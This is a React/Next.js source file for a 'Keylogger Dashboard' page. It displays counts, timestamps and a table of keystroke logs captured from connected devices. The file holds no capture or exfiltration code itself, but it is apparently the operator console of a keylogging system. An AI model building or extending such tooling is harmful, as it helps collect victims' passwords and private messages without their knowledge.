import { Activity, Clock, Keyboard, Monitor } from "lucide-react";
import type { Metadata } from "next";
import { getLogs, getStats } from "@/lib/db";
import { columns } from "./columns";
import { DataTable } from "./data-table";

export const metadata: Metadata = {
  title: "Dashboard",
  description:
    "View and manage captured keystroke logs from all connected devices.",
};

export const dynamic = "force-dynamic";

export default async function DashboardPage() {
  const [logs, stats] = await Promise.all([getLogs(), getStats()]);

  return (
    <div className="min-h-screen bg-background">
      <div className="mx-auto max-w-7xl px-4 py-8 sm:px-6 lg:px-8">
        {/* Header */}
        <div className="mb-8">
          <h1 className="font-bold text-3xl text-foreground tracking-tight">
            Keylogger Dashboard
          </h1>
          <p className="mt-1 text-muted-foreground text-sm">
            Monitor and view captured keystrokes from connected devices.
          </p>
        </div>

        {/* Stats Cards */}
        <div className="mb-8 grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
          <div className="rounded-lg border bg-card p-4 shadow-sm">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10">
                <Keyboard className="h-5 w-5 text-primary" />
              </div>
              <div>
                <p className="font-medium text-muted-foreground text-sm">
                  Total Logs
                </p>
                <p className="font-bold text-2xl text-foreground">
                  {stats.totalLogs.toLocaleString()}
                </p>
              </div>
            </div>
          </div>

          <div className="rounded-lg border bg-card p-4 shadow-sm">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10">
                <Monitor className="h-5 w-5 text-primary" />
              </div>
              <div>
                <p className="font-medium text-muted-foreground text-sm">
                  Active Devices
                </p>
                <p className="font-bold text-2xl text-foreground">
                  {stats.totalDevices}
                </p>
              </div>
            </div>
          </div>

          <div className="rounded-lg border bg-card p-4 shadow-sm">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10">
                <Clock className="h-5 w-5 text-primary" />
              </div>
              <div>
                <p className="font-medium text-muted-foreground text-sm">
                  Latest Log
                </p>
                <p className="font-semibold text-foreground text-sm">
                  {stats.newestLog
                    ? new Intl.DateTimeFormat("en-US", {
                        month: "short",
                        day: "2-digit",
                        hour: "2-digit",
                        minute: "2-digit",
                        hour12: true,
                      }).format(new Date(stats.newestLog))
                    : "No logs yet"}
                </p>
              </div>
            </div>
          </div>

          <div className="rounded-lg border bg-card p-4 shadow-sm">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10">
                <Activity className="h-5 w-5 text-primary" />
              </div>
              <div>
                <p className="font-medium text-muted-foreground text-sm">
                  Devices
                </p>
                <p className="max-w-[160px] truncate font-semibold text-foreground text-sm">
                  {stats.devices.length > 0 ? stats.devices.join(", ") : "None"}
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Data Table */}
        <div className="rounded-lg border bg-card p-4 shadow-sm">
          <div className="mb-4">
            <h2 className="font-semibold text-foreground text-lg">
              Captured Logs
            </h2>
            <p className="text-muted-foreground text-sm">
              All keystroke logs received from connected devices.
            </p>
          </div>
          <DataTable columns={columns} data={logs} />
        </div>
      </div>
    </div>
  );
}
